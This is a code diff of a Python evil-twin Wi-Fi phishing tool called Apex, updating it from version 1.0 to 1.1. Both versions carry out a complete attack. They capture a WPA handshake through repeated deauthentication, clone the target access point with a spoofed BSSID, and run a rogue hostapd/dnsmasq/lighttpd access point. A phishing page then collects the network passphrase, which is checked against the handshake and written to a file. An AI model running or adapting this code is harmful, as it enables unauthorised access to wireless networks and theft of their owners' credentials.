@@ -1,452 +1,274 @@
-# Date: 07/04/2017
-# Distro: Kali linux
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 # Author: Ethical-H4CK3R
-# Description: Obtain password using social engineering
+# Date: 01/08/2018
+# Version = 1.1
+
+from sys import exit
+from time import sleep
+from random import randint
+from threading import Thread
+from lib.webpage import Webpage
+from subprocess import Popen, call
+from lib.interface import Interface
+from argparse import ArgumentParser
+from lib.deauth import Deauthenticate
+from commands import getoutput as shell
+from lib.eviltwin import MonitorEviltwin
+from lib.accesspoints import Accesspoints
+from lib.aircrack import Discover, Monitor
 
 import os
-import csv
-import time
 import shutil
-import socket
-import argparse
-import threading
-import subprocess
-from core.config import *
-from core.dns import Dns as DnsServer
-from core.webpage import Webpage as SiteHandler
-from core.deauth import Deauthenticate as Deauth
-from core.eviltwin import MonitorEviltwin as Eviltwin
-from core.interface import Interface as InterfaceManager
-from core.accesspoints import Accesspoints as NetworkManager
+import lib.settings as settings
 
-__version__ = 1.0
+class Apex(object):
+ ''' Using Social Engineer To Hack Wifi '''
 
-class Aircrack(Deauth,Eviltwin,DnsServer,SiteHandler,NetworkManager,InterfaceManager):
- def __init__(self,iface,wlan=None):
-  Deauth.__init__(self)
-  Eviltwin.__init__(self)
-  DnsServer.__init__(self)
-  SiteHandler.__init__(self)
-  NetworkManager.__init__(self)
-  InterfaceManager.__init__(self,iface)
+ def __init__(self, iface, ap, handshake):
 
-  self.iface = iface
-  self.wlan = wlan if wlan else iface
+  self.ap_essid = ap['essid']
+  self.ap_chann = ap['chann']
+  self.ap_bssid = self.mac_address(ap['bssid'])
 
-  self.out = '.data-01.out'
-  self.csv = 'data-01.csv'
-  self.cap = 'data-01.cap'
+  self.evil_twin = MonitorEviltwin()
+  self.phishing = Webpage(handshake)
+  self.devnull = open(os.devnull, 'w')
+  self.errors = open(settings.ERROR_LOG, 'a')
+  self.deauth = Deauthenticate(settings.DEAUTH_INTERFACE, ap['bssid'])
+  Interface().create_iface(iface, settings.EVIL_TWIN_INTERFACE, self.ap_bssid)
 
-  self.ap = None
-  self.atk = False
-  self.alive = True
-  self._exit = False
-  self.bssid = None
-  self.essid = None
-  self.loadAp = True
-  self.channel = None
-  self.handshake = None
-  self.monitorNetwork = False
+ def mac_address(self, bssid):
+  bssid = bssid.lower()
+  current_item = bssid[9]
 
- def _killProc(self):
-  cmd0 = "for task in `lsof -i 80 | grep -v 'COMMAND' | grep -v 'firefox-e'\
-         | awk '{print $2}'`; do kill -9 $task;done"
-  cmd1 = "for task in `lsof -i 80 | grep -v 'COMMAND' | grep -v 'firefox-e'\
-         | awk '{print $2}'`; do kill -15 $task;done"
-  cmd2 = "for task in `lsof -i 53 | grep -v 'COMMAND' | grep -v 'firefox-e'\
-         | awk '{print $2}'`; do kill -9 $task;done"
-  cmd3 = "for task in `lsof -i 53 | grep -v 'COMMAND' | grep -v 'firefox-e'\
-         | awk '{print $2}'`; do kill -15 $task;done"
+  items = '0123456789abcdef'
+  get_item = lambda: items[randint(0, len(items)-1)].lower()
+  new_item = get_item()
 
-  for cmd in [cmd0,cmd1,cmd2,cmd3]:
-   subprocess.Popen(cmd,stdout=devnull,stderr=devnull,shell=True).wait()
+  # looking like the target without becoming the target
+  while new_item == current_item:
+   new_item = get_item()
 
- def killProc(self):
-  for proc in ['airodump-ng','aireplay-ng','aircrack-ng','hostapd','lighttpd',
-               'php-cgi','dhcpd','apache2','wpa_supplicant']:
-   subprocess.Popen('pkill {}'.format(proc),stdout=devnull,stderr=devnull,shell=True).wait()
+  _bssid = list(bssid.upper())
+  _bssid[9] = new_item.upper()
 
- def kill(self,killall=False):
-  self.killProc()
-  if killall:self._killProc()
-
- def remove(self):
-  for f in os.listdir('.'):
-   if any([f.startswith('data'),f.startswith('.data')]):
-    os.remove(f)
-
- def exitMsg(self):
-  while not self._exit:
-   for n in range(4):
-    subprocess.call(['clear'])
-    print 'Exiting {}'.format(n*'.')
-    time.sleep(.4)
-
- def exit(self,display=True):
-  try:
-   self.alive = False
-   try:shutil.rmtree(ApeX)
-   except OSError:pass
-   time.sleep(.5)
-   self.kill()
-   if display:
-    threading.Thread(target=self.exitMsg).start()
-   if self.udp:
-    self.udp.close()
-   self.managedMode()
-   time.sleep(5 if self.display else 1)
-  finally:
-   self._exit = True
-   exit()
-
- def loading(self,ssid=None,load=False):
-  if load:
-   self.ap.aps = False
-   self.handshake = False
-  else:
-   self.ap = NetworkManager(ssid)
-  while all([not self.handshake,not self.ap.aps,self.alive,self.loadAp]):
-   for n in range(4):
-    time.sleep(.4)
-    if self.ap.aps:break
-    if not self.alive:break
-    if self.handshake:break
-    if not self.loadAp:break
-    subprocess.call(['clear'])
-    if load:
-     print 'Creating Eviltwin Accesspoint {}'.format(n*'.')
-    elif not ssid:
-     print 'Scanning {}'.format(n*'.')
-    else:
-     print 'Searching for: {} {}'.format(ssid,n*'.')
-
- def display(self):
-  if os.path.exists(self.csv):
-   time.sleep(.1)
-   self.ap.open(self.csv)
-
- def scan(self):
-  cmd = ['airodump-ng','-a','-w','data','--output-format','csv',self.iface]
-  subprocess.Popen(cmd,stdout=devnull,stderr=devnull)
-
- def startScan(self):
-  iface = 'mon0'
-
-  threading.Thread(target=self.loading).start()
-  self.monitorMode(iface)
-  self.iface = iface
-  self.kill(True)
-  self.remove()
-  self.scan()
-
- def grabChannel(self):
-  if os.path.exists(self.csv):
-   with open(self.csv,'r') as csvfile:
-    csvfile = csv.reader(csvfile,delimiter=',')
-    lines = [line for line in csvfile]
-    num = [num for num,line in enumerate(lines) if len(line)==15 if line[0]==self.bssid]
-    return lines[num[0]][3] if num else None
-
- def updateInfo(self):
-  try:
-   ap = self.ap.aps[self.bssid]
-  except KeyError:return
-  self.kill()
-  self.remove()
-  threading.Thread(target=self.loading,args=[self.essid]).start()
-  cmd = ['airodump-ng','-w','data','--output-format','csv','-a',self.iface]
-  subprocess.Popen(cmd,stdout=devnull,stderr=devnull)
-  while self.alive:
-   chann = self.grabChannel()
-   if chann:
-    essid = ap['essid']
-    self.channel = chann.strip()
-    self.essid = essid if all([essid != 'HIDDEN',essid != 'UNKNOWN']) else self.essid
-    break
-
- def attack(self):
-  cmd = ['aireplay-ng','-0',str(1),'-a',self.bssid,'--ignore-negative-one',self.iface]
-  subprocess.Popen(cmd,stdout=devnull,stderr=devnull).wait()
-  time.sleep(1.3)
-
- def readCap(self):
-  if os.path.exists(self.cap):
-   log = open(self.out,'w')
-   cmd = ['aircrack-ng',self.cap]
-   subprocess.Popen(cmd,stdout=log,stderr=log).wait()
-   log.close()
-
- def readLog(self):
-  if not os.path.exists(self.out):return
-  with open(self.out) as aircrackOutput:
-   try:
-    line = [line for line in aircrackOutput if '(1' in line.split()]
-   except IndexError:return
-   try:
-    if line:
-     if self.essid == self.bssid:
-      try:
-       essid = self.ap.aps[self.bssid]['essid']
-       if any([essid != self.bssid,essid != 'HIDDEN',essid != 'UNKNOWN']):
-        self.essid = essid
-       else:return
-      except KeyError:return
-     if all([self.essid != 'HIDDEN',self.essid != 'UNKNOWN']):
-      self.handshake = True
-      self.postHandshake()
-   except NameError:return
-
- def listen(self):
-  try:
-   ap = self.ap.aps[self.bssid]
-  except KeyError:return
-  if ap['client']:
-   self.atk = True
-   self.attack()
-   if not self.handshake:
-    self.readCap()
-    self.readLog()
-    self.atk = False
-
- def postHandshake(self):
-  shutil.copyfile(self.cap,'handshake.cap')
-  self.cap = 'handshake.cap'
-  self.remove()
-  self.kill()
-
- def preHandshake(self):
-  while all([not self.handshake,self.alive,self.monitorNetwork]):
-   self.display()
-   if all([not self.atk,self.ap.aps]):
-    threading.Thread(target=self.listen).start()
-   time.sleep(1.7)
-
- def scanTarget(self):
-  self.kill()
-  self.remove()
-  cmd = ['airodump-ng','-a','--bssid',self.bssid,'-c',self.channel,'-w',
-         'data','--output-format','cap,csv',self.iface]
-  subprocess.Popen(cmd,stdout=devnull,stderr=devnull)
-  time.sleep(1.5)
-
-class Apex(Aircrack):
- def __init__(self,iface,wlan,bssid,_bssid,essid,channel):
-  super(Apex,self).__init__(iface,wlan=wlan)
-  self.bssid = bssid # eviltwin ap
-  self.essid = essid
-  self._iface = 'mon1' # deauth interface
-  self._bssid = _bssid # target ap
-  self.channel = channel
+  return ''.join(_bssid)
 
  def disconnect(self):
-  time.sleep(5)
-  self.configAttack()
-  self.monitorMode('mon1')
-  while all([not self.passphrase,self.alive]):
-   try:map(self.sendPkts,range(256))
-   except:pass
+  while all([not self.phishing.passphrase, self.phishing.is_alive]):
+   map(self.deauth.send_pkts, range(256))
 
- def configAp(self):
-  Hostapd(self.channel,self.essid,self.iface).write()
-  Lighttpd().write()
-  Dhcpd().write()
+ def create_configs(self):
 
- def route(self):
-  subprocess.Popen('ifconfig {} 192.168.0.1 netmask 255.255.255.0'.format(self.iface),
-  stdout=devnull,stderr=devnull,shell=True).wait()
-  subprocess.Popen('route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1',
-  stdout=devnull,stderr=devnull,shell=True).wait()
-  subprocess.Popen('sysctl -w net.ipv4.ip_forward=1',stdout=devnull,shell=True).wait()
+  # Hostapd
+  with open(settings.HOSTAPD_CONFIG_PATH, 'w') as hostapd_config:
+   hostapd_config.write(settings.HOSTAPD_CONFIG.format(self.ap_essid, self.ap_chann, settings.EVIL_TWIN_INTERFACE))
 
- def startAp(self):
-  output = open(self.hostapdOutput,'w')
-  subprocess.Popen('hostapd hostapd.conf',stdout=output,shell=True)
-  time.sleep(5)
+  # Lighttpd
+  with open(settings.LIGHTTPD_CONFIG_PATH, 'w') as lighttpd_config:
+   lighttpd_config.write(settings.LIGHTTPD_CONFIG)
 
- def iptables(self):
-  cmds = ['iptables --flush','iptables --table nat --flush','iptables --delete-chain','iptables -P FORWARD ACCEPT',
-  'iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.0.1:80',
-  'iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.0.1:443',
-  'iptables -A INPUT -p tcp --sport 443 -j ACCEPT','iptables\
-  -A OUTPUT -p tcp --dport 443 -j ACCEPT',
-  'iptables -t nat -A POSTROUTING -j MASQUERADE']
+  # Dnsmasq
+  with open(settings.DNS_CONFIG_PATH, 'w') as dnsmasq_config:
+   if os.path.exists(settings.DNS_LEASES_PATH):os.remove(settings.DNS_LEASES_PATH)
+   dnsmasq_config.write(settings.DNS_CONFIG.format(settings.EVIL_TWIN_INTERFACE, settings.GATEWAY, settings.DHCP_RANGE))
 
-  for cmd in cmds:
-   subprocess.Popen(cmd,stdout=devnull,shell=True).wait()
+ def start_ap(self):
+  output = open(settings.EVIL_TWIN_OUTPUT, 'w')
+  Popen('hostapd {}'.format(settings.HOSTAPD_CONFIG_PATH), stderr=self.errors, stdout=output, shell=True)
+  sleep(1.5)
 
- def dnsServer(self):
-  self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-  self.udp.bind(('',53))
-  while all([not self.passphrase,self.alive]):
-   try:self.runDns()
-   except:pass
+ def start_dns(self):
+  Popen('dnsmasq -C {}'.format(settings.DNS_CONFIG_PATH), stderr=self.errors, stdout=self.devnull, shell=True)
+  sleep(1.5)
 
- def authen(self):
-  self.setConfig()
-  while all([not self.passphrase,self.alive]):
-   self.runServer()
+ def start_lighttpd(self):
+  Popen('lighttpd -f {}'.format(settings.LIGHTTPD_CONFIG_PATH), stderr=self.errors, stdout=self.devnull, shell=True)
+  sleep(1.5)
 
- def dhcpd(self):
-  cmd = 'dhcpd -d -f -lf dhcpd.leases -cf dhcpd.conf'
-  subprocess.Popen(cmd,stdout=devnull,stderr=devnull,shell=True)
+ def config_net(self):
+  Popen('ifconfig {0} mtu 1400 && ifconfig {0} up {1} netmask {2}'.format(
+  settings.EVIL_TWIN_INTERFACE, settings.GATEWAY, settings.NET_MSK),stderr=self.errors, shell=True)
+  sleep(1.5)
 
- def lighttpd(self):
-  subprocess.Popen('lighttpd -f lighttpd.conf',stdout=devnull,stderr=devnull,shell=True).wait()
-  time.sleep(1.5)
+ def start(self):
+  call(['clear'])
+  print '[-] Creating Evil Twin Accesspoint ...'
 
- def ssl(self):
-  cmd = "openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 -nodes -newkey rsa:2048 -subj '/C=RU'"
-  subprocess.Popen(cmd,stdout=devnull,stderr=devnull,shell=True).wait()
-  subprocess.Popen('chmod 400 cert.pem',stdout=devnull,stderr=devnull,shell=True).wait()
+  # evil twin AP
+  self.config_net()
+  self.create_configs()
 
- def displayEviltwin(self):
-  clients = self.eviltwinInfo()
-  channel = '{} '.format(self.channel) if len(self.channel) == 1 else self.channel
-  subprocess.call(['clear'])
+  self.start_ap()
+  self.start_dns()
+  self.start_lighttpd()
+
+  # deauthentication thread
+  Thread(target=self.disconnect).start()
+
+  # monitor phishing site
+  Thread(target=self.phishing.monitor).start()
+
+ def display_evil_twin(self):
+  call(['clear'])
+  clients = self.evil_twin.evil_twin_info()
+  colored = lambda item: '{}{}{}'.format(settings.COLORS['red'], item, settings.COLORS['white'])
+
+  num = colored('000')
+  dash = colored(' -')
+  bssid = colored(self.ap_bssid)
+  essid = colored(self.ap_essid)
+  chann = colored(self.ap_chann if len(str(self.ap_chann)) != 1 else '0{}'.format(self.ap_chann))
+
   if clients:
-   for n in clients:
-    print n
+   for n in clients:print n
+   sleep(1)
+
   else:
-   print '                  +------------------------+'
-   print '                  || Eviltwin Accesspoint ||'
-   print '----------------------------------------------------------------'
-   print '|| num  || \t  Bssid\t       || Channel ||  Client || Essid ||'
-   print '----------------------------------------------------------------'
-   print '----------------------------------------------------------------'
-   print '|| 0    ||  {}  ||    {}   ||\t-    || {} '.format(self.bssid.upper(),channel,self.essid)
-   print '+--------------------------------------------------------------+'
+   print '              +-------------------------+'
+   print '              || Evil Twin Accesspoint ||'
+   print '-'*60
+   print '|| {}NUM{} ||     \tBssid\t    || Channel || Client || Essid ||'.\
+   format(settings.COLORS['yellow'], settings.COLORS['white'])
+
+   print '-'*60
+   print '+{}+'.format('-'*58)
+   print '|| {} || {} ||   {}    ||   {}   || {} '.\
+   format(num, bssid, chann, dash, essid)
+   print '+{}+'.format('-'*58)
+   sleep(1)
+
+def kill_processes():
+ for proc in settings.ENTER_EXIT_PROC['proc']:
+  cmd = 'pkill {}'.format(proc)
+  Popen(cmd, shell=True).wait()
+
+def stop_services():
+ for service in settings.ENTER_EXIT_PROC['services']:
+  cmd = 'service {} stop'.format(service)
+  Popen(cmd, shell=True).wait()
+
+def start_services():
+ for service in settings.ENTER_EXIT_PROC['services']:
+  cmd = 'service {} start'.format(service)
+  Popen(cmd, shell=True).wait()
+
+def config_work_dir():
+ if not os.path.exists(settings.WORKING_PATH):
+  os.mkdir(settings.WORKING_PATH)
+ else:
+  for item in os.listdir(settings.WORKING_PATH):
+   if any([item.endswith('.cap'), item.endswith('.csv')]):
+    os.remove(settings.WORKING_PATH + '/' + item)
+
+def test_injection(iface):
+ call(['clear'])
+ shell('ifconfig {0} down && ifconfig {0} up'.format(iface))
+ print '[-] Testing Packet Injection on {} ...'.format(iface)
+
+ if not 'Injection is working' in shell('aireplay-ng -9 {}'.format(iface)):
+
+  call(['clear'])
+  exit('[!] Packet Injection is not working on {}!'.format(iface))
+
+def find_interface(iface):
+ if not iface in shell('iwconfig'):
+  call(['clear'])
+  exit('[!] Unable to find {}'.format(iface))
+
+def move_web_src():
+ for _ in os.listdir(settings.SITE):
+  current_path = '{}/{}'.format(settings.SITE, _)
+  new_path = '{}/{}'.format(settings.HOSTING_PATH, _)
+  if os.path.isdir(current_path):shutil.copytree(current_path, new_path)
+  else:shutil.copy2(current_path, new_path)
+
+def remove_iface():
+ interface = Interface()
+ interface.remove_iface(settings.SCAN_INTERFACE)
+ interface.remove_iface(settings.DEAUTH_INTERFACE)
+ interface.remove_iface(settings.EVIL_TWIN_INTERFACE)
+
+def remove_files():
+ for item in os.listdir(settings.WORKING_PATH):
+  if os.path.isfile(settings.WORKING_PATH + '/' + item):
+   if settings.ERROR_LOG != settings.WORKING_PATH + '/' + item:
+    os.remove(settings.WORKING_PATH + '/' + item)
+
+def enter_cmds():
+ stop_services()
+ kill_processes()
+ try:shutil.rmtree(settings.HOSTING_PATH)
+ except:pass
+
+def exit_cmds():
+ print '[-] Exiting ...'
+ kill_processes()
+ start_services()
+
+ remove_iface()
+ remove_files()
+ try:shutil.rmtree(settings.HOSTING_PATH)
+ except:pass
+ exit()
 
 def main():
- # assign arugments
- args = argparse.ArgumentParser()
- args.add_argument('interface',help='wireless interface')
- args = args.parse_args()
+ args = ArgumentParser()
+ args.add_argument('interface', help='wireless interface')
+ iface = args.parse_args().interface
 
- # assign variables
- wlan = args.interface
- engine = Aircrack(wlan)
- apexDir = ApeX
+ enter_cmds()
+ find_interface(iface)
 
- # remove directory
- if os.path.exists(apexDir):
-  shutil.rmtree(apexDir)
+ # injection test
+ remove_iface()
+ test_injection(iface)
 
- # create directory
- os.mkdir(apexDir)
+ # start
+ call(['clear'])
+ config_work_dir()
+ print '[-] Scanning ...'
 
- # change directory
- os.chdir(apexDir)
-
- # clear the screen
- subprocess.call(['clear'])
-
- # start scanning
  try:
-  engine.startScan()
+  target_ap = Discover(iface).run()
+  if not target_ap:exit_cmds()
+
+  get_handshake = Monitor(iface, target_ap)
+  get_handshake.scan()
+
+  if not get_handshake.handshake:
+   exit_cmds()
+
+  # create phishing page directory
+  phishing = Webpage(get_handshake._handshake_file)
+  os.mkdir(settings.HOSTING_PATH)
+  move_web_src()
+
+  # create phishing object
+  apex = Apex(iface, target_ap, get_handshake._handshake_file)
+  apex.start()
+
+  while not apex.phishing.passphrase:
+   try:
+    apex.display_evil_twin()
+    sleep(0.5)
+   except KeyboardInterrupt:break
+
+  apex.display_evil_twin()
+  result = '{}{}{}'.format(settings.COLORS['red'] if not apex.phishing.passphrase else settings.COLORS['green'],
+  'NOT FOUND' if not apex.phishing.passphrase else apex.phishing.passphrase, settings.COLORS['white'])
+  print '\n[-] Pre-Shared Key: {}'.format(result)
+  apex.phishing.is_alive = False
+
+  if apex.phishing.passphrase:
+   with open(get_handshake.handshake_path + '/info.txt', 'w') as info:
+    info.write('[-] ESSID: {}\n[-] BSSID: {}\n[+] Pre-SharedKey: {}'.\
+    format(target_ap['essid'], target_ap['bssid'], apex.phishing.passphrase))
+  exit_cmds()
+
  except KeyboardInterrupt:
-  engine.exit()
-
- # display
- while 1:
-  try:
-   cache = engine.display()
-  except KeyboardInterrupt:
-   engine.kill() if engine.ap.aps.keys() else engine.exit()
-   break
-
- # user input
- try:
-  cache
-  engine.bssid = engine.ap.mem[eval(raw_input('\nEnter a num: '))]
-  engine.essid = engine.ap.aps[engine.bssid]['essid']
-  engine.essid = engine.essid if all([engine.essid != 'HIDDEN',engine.essid != 'UNKNOWN']) else engine.bssid
-  engine.channel = engine.ap.aps[engine.bssid]['chann']
- except:
-  engine.exit()
-
- # display scanning [target] ...
- threading.Thread(target=engine.loading,args=[engine.essid]).start()
-
- # listen for handshake
- while all([not engine.handshake,engine.alive]):
-  try:
-   engine.scanTarget()
-   engine.monitorNetwork = True
-   threading.Thread(target=engine.preHandshake).start()
-   # wait for 60 second before obtaining info
-   for t in range(60):
-    time.sleep(1)
-    if engine.handshake:
-     break
-   engine.monitorNetwork = False
-   if engine.atk: # attacking the target ap
-    while engine.atk:pass # wait for the attack to finish
-    time.sleep(3.5) # wait for handshake
-   if not engine.handshake:# check if a handshake is captured
-    engine.updateInfo()
-  except KeyboardInterrupt:
-   engine.exit()
-
- # run eviltwin accesspoint
- try:
-  # set phishing variable
-  apex = Apex(engine.iface,wlan,engine.mac,engine.bssid,engine.essid,engine.channel)
-
-  # creating eviltwin accesspoint ...
-  threading.Thread(target=engine.loading,kwargs={'load':True}).start()
-
-  # copy site --> /tmp/ApeX/
-  shutil.copytree('{}/site'.format(HQ),'{}site/'.format(apexDir))
-
-  # configure ap
-  apex.configAp()
-
-  # set gateway
-  apex.route()
-
-  # generate ssl cert
-  apex.ssl()
-
-  # config iptables
-  apex.iptables()
-
-  # start ap
-  apex.startAp()
-
-  # start dhcpd
-  apex.dhcpd()
-
-  # start webserver
-  apex.lighttpd()
-
-  # start dns server
-  threading.Thread(target=apex.dnsServer).start()
-
-  # start password validator
-  threading.Thread(target=apex.authen).start()
-
-  # stop loading
-  engine.loadAp = False
-
-  # start deauthentication attack
-  threading.Thread(target=apex.disconnect).start()
-
-  # wait for password
-  while all([not apex.passphrase,apex.alive]):
-   apex.displayEviltwin()
-   time.sleep(3)
- finally:
-  engine.loadAp = False
-  if apex.passphrase:
-   time.sleep(10) # gif loading
-   subprocess.call(['clear'])
-   print 'Password Found: {}'.format(apex.passphrase[0])
-   apex.exit(False)
-  else:
-   apex.exit()
+  exit_cmds()
 
 if __name__ == '__main__':
- HQ = os.getcwd()
- ApeX = '/tmp/ApeX/'
- devnull = open(os.devnull,'w')
- exit('root access required') if os.getuid() else main()
+ main()
